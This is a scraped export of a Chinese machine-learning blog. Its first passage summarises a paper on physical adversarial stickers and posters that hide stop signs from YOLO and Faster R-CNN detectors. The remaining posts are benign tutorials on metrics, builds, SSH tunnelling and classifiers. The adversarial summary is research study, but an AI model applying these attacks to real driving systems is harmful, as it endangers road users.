xi 是“规范”目标对象的旋转版本，则扰动 Mx · δ 也应当被适当地旋转。fθ（·）是分类器网络的输出，y * 是对抗目标类。\n作者提出的 RP2 扩展算法 与 RP2 的三个关键性差异 由于分类器和对象检测器的输出行为的差异，对对抗损失函数进行了修改 增加“对抗性扰动必须是鲁棒的”这个约束，并综合建模 引入一个平滑约束的目标，而不是使用 p 范数 损失函数的更改 相较于分类网络输出单一向量（表示图像是该类别的可能性），目标检测器输出一组边界框和给定某个置信度阈值的包含在该框内的最可能对象的可能性。\n对图像分类器的攻击通常利用该输出向量与对抗目标的 one-hot 表示之间的交叉熵损失（the cross-entropy loss between this output vector, and a one-hot representation of the adversarial target），但是这不适用于目标检测的复杂情况\n消失攻击的损失函数 为了让对象被目标检测器忽视，对抗性扰动必须确保任何边界框中目标对象的可能性小于检测阈值，因此损失函数如下（与 RP2 中的损失函数对应）：\n其中 fθ（x）表示对象检测器的输出（对于 YOLO v2，这是一个 19×19×425 张量）。P（·）是从该张量中提取对象类的概率的函数，在网格单元 s 和边界框 b 中具有标签 y（在我们的情况下，这是停止符号）。x 是包含我们扰动的目标对象的输入场景。\n因此，如果停止符号出现在场景中，损失函数输出停止符号的最大概率。使用该损失函数，对手的目标是直接最小化该概率，直到其降到这个网络的检测阈值之下。\n创造攻击的损失函数 掩模 Mx 被随机采样，使得对抗补丁被应用于场景中的任意位置。\nτ 是框置信度的阈值。\nPbox（s，b，fθ（x））仅表示框的概率，即，模型对框中包含任何物体的置信度。\nP（s，b，y，fθ（x））表示分配给网格单元 s 的框 b 中的类别 y 的概率，也就是上面说的从 YOLO 输出张量中提取对象类的概率的函数\n因此，如果框中越有可能有对象，那么 loss 就越大；如果分配给网格单元 s 的框 b 中的类别 y 的概率越大，loss 越大。因此，该 loss 函数表示，如果在一个地方，越不可能被检测出对象，且越不可能被提取出对象类，loss 就越小\n新物理约束的综合表示 想要愚弄对象检测器，我们需要考虑的物理条件比分类器要多得多。对象检测器考虑到的上下文比分类器的更多，由于对象的位置和大小可以根据观看者的位置而变化很大，因此扰动必须考虑这些附加约束。\n为了生成位置不变的物理对抗扰动，作者选择对两个环境条件进行综合建模：对象旋转（在 Z 平面）和位置（在 X-Y 平面）（基本上就是物理的三个维度），在优化的每个时期随机放置和旋转对象。\n作者避免了像 RP2 那样使用不同的数据集来模拟物体的物理旋转，而是采用了一种合成的方法\n全变分（total variation norm）的噪声平滑 参考：全变分图像去噪算法（TV）_Nirvana；的博客-CSDN 博客\n由于 RP2 使用的 p 范数扰动平滑会导致像素化的扰动，而像素化会降低物理世界中扰动的成功率（尤其是当观看者和对象之间的距离增加时）。\n使用全变分范数代替 p 范数，可以得到更平滑的扰动，从而增加攻击的有效范围\n给定掩码 Mx 和噪声 δ，对抗扰动的总变差范数 Mx · δ 为：\n因此总的新目标函数是：\n实验结果 一共有两种掩码方式，一种是 poster 的，也就是对 STOP 标志全覆盖的；另一种是 sticker 的，也就是只对 STOP 标志做一些装饰的：\n对 YOLOv2 的白盒攻击 对 Faster R-CNN 的黑盒攻击 可以看到，Poster 的方式一般来说比 sticker 的成功率高，可能是因为更改率更高；同时不论是白盒攻击还是黑盒攻击，不论是 Poster 的还是 Sticker 的，在 Outdoors 的情况下成功率都大幅下降，这可能是因为在户外情况下的精度损失\n未来方向 环境因素导致的精度损失从而造成成功率下降 对目标检测器的其他攻击方式 不更改其框而更改其类 生成对人类看起来无意义但由对象检测器检测和标记的另外的 2D 或甚至 3D 对象 以上两种都有数字化的攻击 语义分割的扩展（如何扩展当前的分类器和检测器的攻击技术，以创建分割网络的物理攻击） 对现实系统的影响（是否对基于现实的复杂情况下的目标检测系统有效） 关键是创建可以攻击最先进的对象检测器的算法\n","date":"2023年12月03日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E7%9A%84%E7%89%A9%E7%90%86%E5%AF%B9%E6%8A%97%E7%A4%BA%E4%BE%8B-physical-adversarial-examples-for-object-detectors/","section":"posts","summary":"Do not wait; the time will never be \u0026lsquo;just right.\u0026rsquo; Start where you stand, and work with whatever tools you may have at your command, and better tools will be found as you go along. — George Herbert 【论文笔记】目标识别的物理对抗示例 Physical Adversarial Examples for Object Detectors 目标识别模型难于攻击 物理扰动","tags":["backdoor_attack"],"title":"【论文笔记】目标识别的物理对抗示例 Physical Adversarial Examples for Object Detectors"},{"categories":["principle"],"contents":" Life is a progress, and not a station. — Ralph Waldo Emerson\n基本度量公式 参考：\n通俗理解TP、FP、TN、FN 机器学习：mAP评价指标_JacksonKim的博客-CSDN博客 目标检测算法的评估指标：mAP定义及计算方式 目标检测中的Precision和Recall 锚框（anchor box）理解和代码实现 简单理解锚框(anchor box)生成过程 锚框：Anchor box综述 TP、FP、TN、FN TP：True Positive，真阳性，分类器预测结果为正样本，实际也为正样本，即正样本被正确识别的数量。 FP：False Positive，假阳性，分类器预测结果为正样本，实际为负样本，即误报的负样本数量。 TN：True Negative，真阴性，分类器预测结果为负样本，实际为负样本，即负样本被正确识别的数量。 FN：False Negative，假阴性，分类器预测结果为负样本，实际为正样本，即漏报的正样本数量。 从而：\nTP+FN：真实正样本的总和，正确分类的正样本数量+漏报的正样本数量。 FP+TN：真实负样本的总和，负样本被误识别为正样本数量+正确分类的负样本数量。 TP+TN：正确分类的样本总和，正确分类的正样本数量+正确分类的负样本数量。 Accuracy准确率、Precision精确度、Recall召回（查全）率 $$ Accuracy = \\frac{TP+TN}{样本总数} $$\n$$ Pression = \\frac{TP}{TP+FP} $$\n$$ Recall = \\frac{TP}{TP+FN} $$\n思考：对于Precision值，其代表的是你所预测出来准确结果占所有预测结果的准确性，对于Recall值，其代表的是你所预测出来准确结果占总体正样本的准确性。这样说有点难理解，举个例子吧。现在你手上有10个鸡蛋，里面有6个是好的，另外4个是坏的，你训练出一个模型，检测出8个鸡蛋是好的，但实际上只有5个是好的，另外3个是坏的。那么模型的Precision值为5/8=0.625，即表示你所预测出来的8个鸡蛋中只有5个是好的，其值只在你预测结果中计算得到，Recall值为5/6=0.833，即表示总共有6个正样本，你预测出来5个，表示的是你预测出来的正样本占总正样本的比例。(正样本理解为你要检测的目标)\nPrecision与Recall曲线 把每次预测结果的Precision和Recall计算出来，并按照关系画出曲线，就是P-R曲线\nF1 Score F1 Score是Precision与Recall的调和平均(harmonic mean)，是综合Precision与Recall的评估指标，避免Precision或Recall的单一极大值，用于综合反映整体的指标\n$$ F1 = 2 \\cdot \\frac{Precision \\cdot Recall}{Precision + Recall} $$\nConfidence Score置信度分数 和 IoU交并比 Confidence Score 置信度分数是一个分类器(Classifier)预测一个锚框(Anchor Box)中包含某个对象的概率(Probability)，当置信度分数大于Confidence Threshold置信度阈值的时候，我们认为在锚框内真包含一个对象\nIoU (Intersection over union)交并比，预测框(Prediction)与原标记框(Ground truth)之间的重叠度(Overlap)\n$$ IoU=\\frac{A\\cap B}{A\\cup B} $$\nAP 在计算AP前，为了平滑P-R曲线，减少曲线抖动的影响，首先对P-R曲线进行插值(interpolation)\n给定某个recall值$r$，用于插值的$P_{interp}$为下一个recall值$r\u0026rsquo;$与当前$r$值之间的最大的Precision值\n$$ P_{interp}(r) = max_{r\u0026rsquo; \\ge r}P(r\u0026rsquo;) $$\nAP计算可以定义为经过插值的precision-recall曲线与X轴包络的面积\n$$ AP=\\sum_{i=1}^{n-1}(r_{i+1}-r_{i})p_{interp}(r_{i+1}) $$\nmAP AP是针对一个类别的，mAP就是将所有类别的AP加起来然后求平均\n$$ mAP=\\frac{\\sum_{i=1}^{K}AP_{i}}{K} $$\n","date":"2023年12月03日","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E5%BA%A6%E9%87%8F%E5%85%AC%E5%BC%8F/","section":"principle","summary":"Life is a progress, and not a station. — Ralph Waldo Emerson 基本度量公式 参考： 通俗理解TP、FP、TN、FN 机器学习：mAP评价指标_JacksonKim的博客-CSDN博客 目标检测算法","tags":["pwn"],"title":"深度学习中的一些基本度量公式"},{"categories":["posts"],"contents":" Without some goals and some efforts to reach it, no man can live. — John Dewey\n首先需要编写好CMakeList.txt，然后编写setup.py如下：\n# setup.py from setuptools import setup, Extension from setuptools.command.build_ext import build_ext import sys import os import setuptools class CMakeExtension(Extension): def __init__(self, name, sourcedir=\u0026#39;\u0026#39;): super().__init__(name, sources=[]) self.sourcedir = os.path.abspath(sourcedir) class CMakeBuild(build_ext): def run(self): for ext in self.extensions: self.build_extension(ext) def build_extension(self, ext): extdir = os.path.abspath(os.path.dirname(self.get_ext_fullpath(ext.name))) cmake_args = [\u0026#39;-DCMAKE_LIBRARY_OUTPUT_DIRECTORY=\u0026#39; + extdir, \u0026#39;-DPYTHON_EXECUTABLE=\u0026#39; + sys.executable] build_args = [] os.makedirs(\u0026#34;build\u0026#34;, exist_ok=True) os.system(f\u0026#34;cd build \u0026amp;\u0026amp; cmake .. {\u0026#39; \u0026#39;.join(cmake_args)} \u0026amp;\u0026amp; cmake --build .\u0026#34;) setup( name=\u0026#39;mylib\u0026#39;, version=\u0026#39;0.1\u0026#39;, ext_modules=[CMakeExtension(\u0026#39;c_lib\u0026#39;)], cmdclass={\u0026#39;build_ext\u0026#39;: CMakeBuild}, zip_safe=False, ) ","date":"2023年12月03日","permalink":"https://peterliuzhi.top/posts/%E5%A6%82%E4%BD%95%E5%9C%A8python%E7%9A%84setup.py%E4%B8%AD%E8%B0%83%E7%94%A8cmake%E6%9E%84%E5%BB%BApython%E5%BA%93%E7%9A%84%E6%8F%92%E4%BB%B6/","section":"posts","summary":"Without some goals and some efforts to reach it, no man can live. — John Dewey 首先需要编写好CMakeList.txt，然后编写setup.py如下： # setup.py from setuptools import setup, Extension from setuptools.command.build_ext import build_ext import sys import os import setuptools class CMakeExtension(Extension): def __init__(self, name, sourcedir=\u0026#39;\u0026#39;):","tags":["杂谈"],"title":"如何在python的setup.py中调用cmake构建python库的插件"},{"categories":["posts","Linux","库"],"contents":" Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. — Harriet Tubman\nsudo apt install dos2unix build-essential # 下载源码 wget http://www.ijg.org/files/jpegsr9d.zip # 解压源码并进入目录 unzip jpegsr9d.zip cd jpeg-9d # 修正编码 dos2unix * tr -d \u0026#39;\\015\u0026#39; \u0026lt; libtool \u0026gt; libtool_new mv libtool libtool_saved mv libtool_new libtool # 授予可执行权限 chmod +x libtool chmod +x config* mkdir build # 配置，最后会安装进build目录下 ./configure --enable-shared --enable-static --prefix=$PWD/build # 构建安装 make \u0026amp;\u0026amp; make install ","date":"2023年12月03日","permalink":"https://peterliuzhi.top/posts/linux%E4%B8%8B%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85libjpeg/","section":"posts","summary":"Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. — Harriet Tubman sudo apt install dos2unix build-essential # 下载源码 wget http://www.ijg.org/files/jpegsr9d.zip # 解压源码并进入目录 unzip jpegsr9d.zip cd jpeg-9d # 修正编码 dos2unix * tr -d \u0026#39;\\015\u0026#39; \u0026lt; libtool \u0026gt; libtool_new mv libtool libtool_saved","tags":["杂谈","libjpeg"],"title":"Linux下如何编译安装libjpeg"},{"categories":["posts","AI"],"contents":" If you live to be a hundred, I want to live to be a hundred minus one day, so I never have to live without you. — A. A. Milne\n概念 支持向量机是一种二类分类模型，它的基本思想是在特征空间中寻找一个超平面，使得两类数据在该超平面两侧并距离超平面尽可能远。这个超平面被称为“决策平面”，它试图找到一个最优的决策边界，使得最近的数据点到这个边界的距离（即“间隔”）最大化。这些距离决策平面最近的数据点被称为“支持向量”。\n更多可见：\n支持向量机的核函数及其选择_支持向量机核函数选择_sunflower_sara的博客-CSDN博客 Python 深入浅出支持向量机（SVM）算法 - zzzzMing - 博客园 总之，支持向量机的目的是找到能将两个类一刀切开的超平面，为此可以将数据点映射到高维使其可分。而核技巧是为了减缓从低维映射到高维的维度爆炸导致的计算困难。\n关于超平面可以阅读：\n如何理解超平面？ - 知乎 代码实现 from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.svm import SVC from sklearn.metrics import accuracy_score, f1_score # 加载数据集 iris = load_iris() X = iris.data y = iris.target # 查看数据集中的不同类别 unique_labels = np.unique(y) # 随机选择两种类别 selected_labels = np.random.choice(unique_labels, 2, replace=False) # 选取这两种类别的数据 X = X[np.isin(y, selected_labels)] y = y[np.isin(y, selected_labels)] X = X[:, :2] # 划分数据集为训练集和测试集 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # 初始化SVC clf = SVC(kernel=\u0026#39;linear\u0026#39;, C=1) # 这里我们使用线性核，你也可以选择其他的，例如：\u0026#39;rbf\u0026#39;, \u0026#39;poly\u0026#39;等 # 训练模型 clf.fit(X_train, y_train) # 预测 y_pred = clf.predict(X_test) # 评估模型性能 accuracy = accuracy_score(y_test, y_pred) print(f\u0026#34;Accuracy: {accuracy * 100:.2f}%\u0026#34;) f1 = f1_score(y_test, y_pred, pos_label=max(y_test)) print(f\u0026#34;f1: {f1 * 100:.2f}%\u0026#34;) # 绘制散点图 plt.scatter(X[:, 0], X[:, 1], c=y, s=30, cmap=plt.cm.Paired) # 绘制决策边界 ax = plt.gca() xlim = ax.get_xlim() ylim = ax.get_ylim() # 创建网格来评估模型 xx = np.linspace(xlim[0], xlim[1], 30) yy = np.linspace(ylim[0], ylim[1], 30) YY, XX = np.meshgrid(yy, xx) xy = np.vstack([XX.ravel(), YY.ravel()]).T Z = clf.decision_function(xy).reshape(XX.shape) # 绘制决策边界和边距 ax.contour(XX, YY, Z, colors=\u0026#39;k\u0026#39;, levels=[-1, 0, 1], alpha=0.5, linestyles=[\u0026#39;--\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;--\u0026#39;]) # 绘制支持向量 ax.scatter(clf.support_vectors_[:, 0], clf.support_vectors_[:, 1], s=100, facecolors=\u0026#39;none\u0026#39;, edgecolors=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Feature 1\u0026#39;) plt.ylabel(\u0026#39;Feature 2\u0026#39;) plt.title(\u0026#39;SVM Decision Boundary with Support Vectors\u0026#39;) plt.show() ","date":"2023年09月02日","permalink":"https://peterliuzhi.top/posts/aisvm%E5%88%86%E7%B1%BB%E5%99%A8/","section":"posts","summary":"If you live to be a hundred, I want to live to be a hundred minus one day, so I never have to live without you. — A. A. Milne 概念 支持向量机是一种二类分类模型，它的基本思想是在特征空间中寻找一个超平面，使得两类数据在","tags":["杂谈","AI","SVM"],"title":"【AI】SVM分类器"},{"categories":["posts"],"contents":" Friendship is also about liking a person for their failings, their weakness. It\u0026rsquo;s also about mutual help, not about exploitation. — Paul Theroux\n引入 很多时候我们需要在服务器上打开一个本地网站服务（比如tensorboard），但是它是在服务器的端口上打开的，应该如何在本机查看呢？\n查了一些资料，很多都是说要下载某某软件，比较麻烦，正好从在远程服务器下运行tensorboard，并在本地浏览器下查看 - 知乎这篇文章发现了一个很好的方法，所以分享一下~\n端口转发 实际上ssh是自带端口转发功能的：\nssh -L 本地端口:127.0.0.1:服务器启动的服务端口 用户名@服务器的IP地址 -p 服务器登录端口 把这个配置到windows terminal等你常用的软件上就可以实现自动化了~\n","date":"2023年08月24日","permalink":"https://peterliuzhi.top/posts/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%93%E5%BC%80%E4%BA%86%E4%B8%80%E4%B8%AAlocalhost%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%AC%E6%9C%BA%E6%9F%A5%E7%9C%8B/","section":"posts","summary":"Friendship is also about liking a person for their failings, their weakness. It\u0026rsquo;s also about mutual help, not about exploitation. — Paul Theroux 引入 很多时候我们需要在服务器上打开一个本地网站服务（比如tensorboard），但是它是在服务器的端口","tags":["杂谈"],"title":"在服务器上打开了一个localhost网站/服务，如何在本机查看？"},{"categories":["posts"],"contents":" I, too, do not envision a doctrine of self the clinging to which there would not arise sorrow, lamentation, pain, grief, and despair. — The Buddha\n以下脚本实现了本地的自动版本管理并提供了一些人性化的log\n#!/bin/bash git add *.py echo \u0026#34;the following files is added to git:\u0026#34; ls *.py if [ -z \u0026#34;$*\u0026#34; ];then git commit -m \u0026#34;`date -Iseconds`\u0026#34; echo \u0026#34;no specified messege for git commit, automatically using current date as the updating messege\u0026#34; else git commit -m \u0026#34;$*\u0026#34; echo \u0026#34;using $* as the messege for updating\u0026#34; fi git log --graph --stat -n 3 echo \u0026#34;HELP:\u0026#34; echo \u0026#39;$ git revert \u0026lt;commit_hash\u0026gt; # recover to a commitment\u0026#39; echo \u0026#34;DONE.\u0026#34; ","date":"2023年08月24日","permalink":"https://peterliuzhi.top/posts/git%E8%87%AA%E5%8A%A8%E5%A4%87%E4%BB%BD%E8%84%9A%E6%9C%AC/","section":"posts","summary":"I, too, do not envision a doctrine of self the clinging to which there would not arise sorrow, lamentation, pain, grief, and despair. — The Buddha 以下脚本实现了本地的自动版本管理并提供了一些人性化的log #!/bin/bash git add *.py echo \u0026#34;the following files is added to git:\u0026#34; ls *.py if [ -z \u0026#34;$*\u0026#34; ];then git","tags":["git","version control","bash"],"title":"【git】自动备份脚本"},{"categories":["posts","AI"],"contents":" The exercise of an extraordinary gift is the supremist pleasure in life. — Mark Twain\nscikit-learn实现随机森林 from sklearn.datasets import load_breast_cancer from sklearn.model_selection import train_test_split from sklearn.ensemble import RandomForestClassifier import numpy as np import matplotlib.pyplot as plt import pandas as pd from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score # 加载数据集 data = load_breast_cancer() X = pd.DataFrame(data.data, columns=data.feature_names) print(data.target_names) y = pd.DataFrame(data.target).squeeze() X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) [\u0026lsquo;malignant\u0026rsquo; \u0026lsquo;benign\u0026rsquo;]\n# n_jobs=-1保证使用最大线程数运行 clf = RandomForestClassifier(n_jobs=-1) clf.fit( X_train, y_train ) features = X_train.columns importances = clf.feature_importances_ # 对重要性进行排序并获取索引 indices = np.argsort(importances) # 绘制特征重要性 plt.figure(figsize=(10, 10)) plt.title(\u0026#34;Feature Importances\u0026#34;) plt.barh(np.array(features)[indices], importances[indices], align=\u0026#34;center\u0026#34;) plt.xlabel(\u0026#39;Importance\u0026#39;) plt.ylabel(\u0026#39;Features\u0026#39;) plt.show() y_pred = clf.predict(X_test) # 处理预测结果 # 0.5是置信度阈值 y_pred = [1 if pred \u0026gt; 0.5 else 0 for pred in y_pred] accuracy = accuracy_score(y_test, y_pred) precision = precision_score(y_test, y_pred) recall = recall_score(y_test, y_pred) f1 = f1_score(y_test, y_pred) print(f\u0026#34;{accuracy=}, {precision=}, {recall=}, {f1=}\u0026#34;) accuracy=0.9649122807017544, precision=0.958904109589041, recall=0.9859154929577465, f1=0.9722222222222222\nlightgbm from sklearn.datasets import load_breast_cancer from sklearn.model_selection import train_test_split import lightgbm as lgb import pandas as pd from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score # 加载数据集 data = load_breast_cancer() X = pd.DataFrame(data.data, columns=data.feature_names) print(data.target_names) y = pd.DataFrame(data.target).squeeze() X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) d_train = lgb.Dataset(X_train, y_train) [\u0026lsquo;malignant\u0026rsquo; \u0026lsquo;benign\u0026rsquo;]\n# 设置参数 params = { \u0026#39;objective\u0026#39;: \u0026#39;binary\u0026#39;, \u0026#39;boosting_type\u0026#39;: \u0026#39;gbdt\u0026#39;, \u0026#39;subsample\u0026#39;: 0.623, \u0026#39;colsample_bytree\u0026#39;: 0.7, \u0026#39;num_leaves\u0026#39;: 127, \u0026#39;max_depth\u0026#39;: 8, \u0026#39;seed\u0026#39;: 42, \u0026#39;bagging_freq\u0026#39;: 1, \u0026#39;n_jobs\u0026#39;: -1 } clf = lgb.train(params, d_train, 100) lgb.plot_importance(clf, height=0.8, title=\u0026#34;Feature Importances\u0026#34;, xlabel=\u0026#34;Importance\u0026#34;, figsize=(10, 10), grid=False, importance_type=\u0026#34;gain\u0026#34;) \u0026lt;Axes: title={\u0026lsquo;center\u0026rsquo;: \u0026lsquo;Feature Importances\u0026rsquo;}, xlabel=\u0026lsquo;Importance\u0026rsquo;, ylabel=\u0026lsquo;Features\u0026rsquo;\u0026gt;\ny_pred = clf.predict(X_test) # 处理预测结果 # 0.5是置信度阈值 y_pred = [1 if pred \u0026gt; 0.5 else 0 for pred in y_pred] accuracy = accuracy_score(y_test, y_pred) precision = precision_score(y_test, y_pred) recall = recall_score(y_test, y_pred) f1 = f1_score(y_test, y_pred) print(f\u0026#34;{accuracy=}, {precision=}, {recall=}, {f1=}\u0026#34;) accuracy=0.9736842105263158, precision=0.9722222222222222, recall=0.9859154929577465, f1=0.979020979020979\nxgboost from sklearn.datasets import load_breast_cancer from sklearn.model_selection import train_test_split import xgboost as xgb import pandas as pd from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score # 加载数据集 data = load_breast_cancer() X = pd.DataFrame(data.data, columns=data.feature_names) print(data.target_names) y = pd.DataFrame(data.target).squeeze() X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) d_train = xgb.DMatrix(X_train, y_train) d_test = xgb.DMatrix(X_test) [\u0026lsquo;malignant\u0026rsquo; \u0026lsquo;benign\u0026rsquo;]\n# 设置参数 params = { \u0026#39;objective\u0026#39;: \u0026#39;binary:logistic\u0026#39;, \u0026#39;booster\u0026#39;: \u0026#39;gbtree\u0026#39;, \u0026#39;subsample\u0026#39;: 0.8, \u0026#39;colsample_bytree\u0026#39;: 0.8, \u0026#39;eta\u0026#39;: 1, \u0026#39;max_depth\u0026#39;: 6, \u0026#39;seed\u0026#39;: 42, \u0026#39;n_jobs\u0026#39;: -1 } # 训练模型 clf = xgb.train(params, d_train, 100) xgb.plot_importance(clf, height=0.8, title=\u0026#34;Feature Importances\u0026#34;, xlabel=\u0026#34;Importance\u0026#34;, grid=False, importance_type=\u0026#34;gain\u0026#34;) \u0026lt;Axes: title={\u0026lsquo;center\u0026rsquo;: \u0026lsquo;Feature Importances\u0026rsquo;}, xlabel=\u0026lsquo;Importance\u0026rsquo;, ylabel=\u0026lsquo;Features\u0026rsquo;\u0026gt;\ny_pred = clf.predict(d_test) # 处理预测结果 # 0.5是置信度阈值 y_pred = [1 if pred \u0026gt; 0.5 else 0 for pred in y_pred] accuracy = accuracy_score(y_test, y_pred) precision = precision_score(y_test, y_pred) recall = recall_score(y_test, y_pred) f1 = f1_score(y_test, y_pred) print(f\u0026#34;{accuracy=}, {precision=}, {recall=}, {f1=}\u0026#34;) accuracy=0.9736842105263158, precision=0.9722222222222222, recall=0.9859154929577465, f1=0.979020979020979\n","date":"2023年08月21日","permalink":"https://peterliuzhi.top/posts/ai%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97lgb%E4%B8%8Exgb%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%9E%E8%B7%B5/","section":"posts","summary":"The exercise of an extraordinary gift is the supremist pleasure in life. — Mark Twain scikit-learn实现随机森林 from sklearn.datasets import load_breast_cancer from sklearn.model_selection import train_test_split from sklearn.ensemble import RandomForestClassifier import numpy as np import matplotlib.pyplot as plt import pandas as pd from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score # 加载数据集 data = load_breast_cancer() X =","tags":["AI","随机森林","lgb","xgb"],"title":"【AI】随机森林、lgb与xgb的代码实践"},{"categories":["posts","AI"],"contents":" Knowledge speaks, but wisdom listens. — Jimi Hendrix\n感知机 感知机是一个简单的二分类线性分类器，是神经网络和深度学习的基石。它基于一个线性预测函数来进行预测，根据这个预测值再经过一个阈值函数来做二分类决策。\n感知机模型的基本形式是：\n$$ f(x) = \\text{sign}(w \\cdot x + b)\n$$\n其中：\n$x$ 是输入向量。 $w$ 是权重向量。 $b$ 是偏置。 $w \\cdot x$ 是 $w$ 和 $x$ 的点积。 $\\text{sign}$ 是符号函数，如果它的参数为正则返回+1，如果参数为负则返回-1。 感知机的学习策略是通过迭代的方式，不断调整权重 $w$ 和偏置 $b$，以减少预测值与真实类标签之间的差异。\n感知机难以处理XOR问题 XOR问题是什么 XOR问题可以看做是单位正方形的四个角，响应的输入模式为（0,0），（0,1），（1,1），（1,0）第一个和第三个模式属于类0，即输入模式（0,0）和（1,1）是单位正方形的两个相对的角，但它们产生相同的结果是0。另一方面，输入模式（0,1）和（1,0）是单位正方形另一对相对的角，但是它们属于类1。\n感知机的一个重要限制是它只能分类线性可分的数据集。也就是说，如果数据集中存在两个类，它们可以通过一个直线、平面或超平面完全分开，那么感知机可以找到这个分类边界。但如果数据是线性不可分的，那么感知机将不能找到一个完美的分类边界。\n感知机的代码实现 感知机比较简单，这里给出一个numpy的实现。注意，训练数据和测试数据一定要是线性可分的\nimport numpy as np import matplotlib.pyplot as plt from sklearn.model_selection import train_test_split def generate_data(num_samples): # 定义直线 ax + by + c = 0 a, b = np.random.uniform(-10, 10, 2) # 随机选择a和b c = np.random.uniform(-10, 10) # 随机选择c # 生成随机点 X = np.random.uniform(-10, 10, (num_samples, 2)) # 根据点到直线的距离给予标签 # d = (a*x + b*y + c) / sqrt(a^2 + b^2) distances = (a * X[:, 0] + b * X[:, 1] + c) / (np.sqrt(a**2 + b**2)) y = np.sign(distances) return X, y # 生成训练数据和测试数据 X, y = generate_data(200) X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2) w, b = np.zeros_like(X_train[0]), 0 epoch = 100 lr = 0.1 flag = True while flag: flag = False for i in range(len(X_train)): pred = w @ X_train[i].T + b if y_train[i] * pred \u0026lt;= 0: w_grad = lr * y_train[i] * X_train[i] b_grad = lr * y_train[i] w += w_grad.T b += b_grad flag = True def plot_line_by_slope_intercept(slope, intercept, xmin=-10, xmax=10, color=\u0026#39;g\u0026#39;, label=None): x_vals = np.linspace(xmin, xmax, 400) y_vals = slope * x_vals + intercept plt.plot(x_vals, y_vals, color=color, label=label) plt.figure(figsize=(6, 6)) plt.scatter(X_test[y_test == 1][:, 0], X_test[y_test == 1][:, 1], c=\u0026#39;r\u0026#39;, label=\u0026#39;positive\u0026#39;, alpha=0.8) plt.scatter(X_test[y_test == -1][:, 0], X_test[y_test == -1][:, 1], c=\u0026#39;b\u0026#39;, label=\u0026#39;negative\u0026#39;, alpha=0.8) plot_line_by_slope_intercept(-w[0]/w[1], -b/w[1], color=\u0026#39;g\u0026#39;, label=\u0026#39;Hyperplane\u0026#39;) # 使用 quiver 函数绘制法向量 plt.quiver(0, 0, w[0], w[1], angles=\u0026#39;xy\u0026#39;, scale_units=\u0026#39;xy\u0026#39;, scale=1, color=\u0026#39;black\u0026#39;, label=\u0026#39;Normal Vector\u0026#39;) plt.legend() ax = plt.gca() ax.set_aspect(\u0026#39;equal\u0026#39;) plt.show() 多层感知机 多层感知机 (MLP, Multi-Layer Perceptron) 是一种前馈式的人工神经网络，包含至少三层节点：输入层、至少一个隐藏层、和一个输出层。每个节点（除输入层外）都是一个神经元，或称为“感知机”，使用一个非线性激活函数。MLP 是一种全连接网络，也就是说，每一层的所有节点都与下一层的所有节点相连。\nMLP 的数学表达可以由以下几个部分构成：\n线性加权和：给定输入 $x$，权重 $W$ 和偏置 $b$，线性加权和表示为： $z = Wx + b$\n非线性激活函数：为了引入非线性性质，我们应用一个非线性激活函数 $f$ 到上述的加权和。常见的激活函数包括 sigmoid、ReLU (Rectified Linear Unit)、tanh 等。 $a = f(z)$ 其中，$a$ 是激活后的输出。\n为了表达一个具有一个隐藏层的 MLP：\n第一层（输入到隐藏）： $z^{[1]} = W^{[1]}x + b^{[1]}$ $a^{[1]} = f(z^{[1]})$\n第二层（隐藏到输出）： $z^{[2]} = W^{[2]}a^{[1]} + b^{[2]}$ $a^{[2]} = f(z^{[2]})$\n其中：\n$x$ 是输入向量。 $W^{[1]}$ 和 $b^{[1]}$ 是第一层的权重和偏置。 $W^{[2]}$ 和 $b^{[2]}$ 是第二层的权重和偏置。 $f$ 是激活函数。 多层感知机一定要一个非线性的激活函数，不然多个线性函数叠加在一起还是一个线性函数\n代码实现 多层感知机的numpy实现涉及一些梯度计算，因此这里给出pytorch的实现：\nimport tqdm import torch from torch import nn import numpy as np from torch.utils.data import Dataset, DataLoader from sklearn.metrics import accuracy_score # 数据初始化 train_shape = (10000, 64) X_train = torch.randn(train_shape[0], train_shape[1], dtype=torch.float) y_train = torch.tensor(np.random.choice([-1, 1], (train_shape[0], 1)), dtype=torch.float) test_shape = (1000, 64) X_test = torch.randn(test_shape[0], test_shape[1], dtype=torch.float) y_test = torch.tensor(np.random.choice([-1, 1], (test_shape[0], 1)), dtype=torch.float) class MyDataset(Dataset): def __init__(self, data, targets): self.data = data self.targets = targets def __len__(self): return len(self.data) def __getitem__(self, index): x = self.data[index] y = self.targets[index] return x, y class MLP(nn.Module): def __init__(self, in_size, out_size): super().__init__() self.hidden1 = nn.Linear(in_size, in_size//2) self.hidden2 = nn.Linear(in_size//2, in_size//4) self.relu = nn.ReLU() self.output = nn.Linear(in_size//4, out_size) # self.relu2 = nn.ReLU() def forward(self, X): X = self.hidden1(X) X = self.relu(X) X = self.hidden2(X) X = self.relu(X) X = self.output(X) return X mlp_net = MLP(64, 1) criterion = 